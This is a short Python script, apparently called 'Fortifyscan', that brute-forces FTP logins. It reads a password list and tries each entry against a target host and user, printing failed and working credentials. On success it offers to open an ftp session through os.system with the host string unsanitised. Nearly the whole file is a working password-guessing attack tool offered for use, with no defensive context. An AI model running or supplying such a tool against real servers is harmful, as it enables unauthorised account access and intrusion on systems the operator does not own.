from ftplib import FTP
import time
import os,sys
import random
import argparse

method = 'ftp'

purple = '\033[95m'
blue = '\033[94m'
green = '\033[92m'
yellow = '\033[93m'
red = '\033[91m'
default = '\033[0m'
underline = '\033[4m'
orange = '\033[33m'

parser = argparse.ArgumentParser(description="Framework Fortifyscan")
parser.add_argument('host', default='127.0.0.1', help=' Target host')
parser.add_argument('user', default='admin', help=' Target user')
parser.add_argument('file_password', help=' Password list')

args = parser.parse_args()
if args.host and args.user and args.file_password:
	user = args.user
	host = args.host
	file = args.file_password
	if os.path.exists(file):
		print(green+'Open file password'+default)
		text = open(file, 'r')
	else:
		print(red+'[!]'+'File not exists '+default)
		sys.exit(1)



def connect():
	for line in text:
		password = line.strip('\r\n')
		try:
			ftp = FTP(host)
			ft = ftp.login(user,password)
			print(green+time.ctime()+default+'Work user-> '+red+user+default+' work password-> '+red+password+default)
			print(default+'Connect ' +host+' ?')
			yes = input('Y/n')
			if yes == 'y' or yes == 'Y':
				print(green+'Ftp connect'+default)
				time.sleep(1)
				os.system('ftp '+host)
				break
			else:
				break
		except:
			print(orange+time.ctime()+default+' '+'Not work user-> '+blue+user+default+' paswword->'+blue+password+default)
	sys.exit(1)
connect()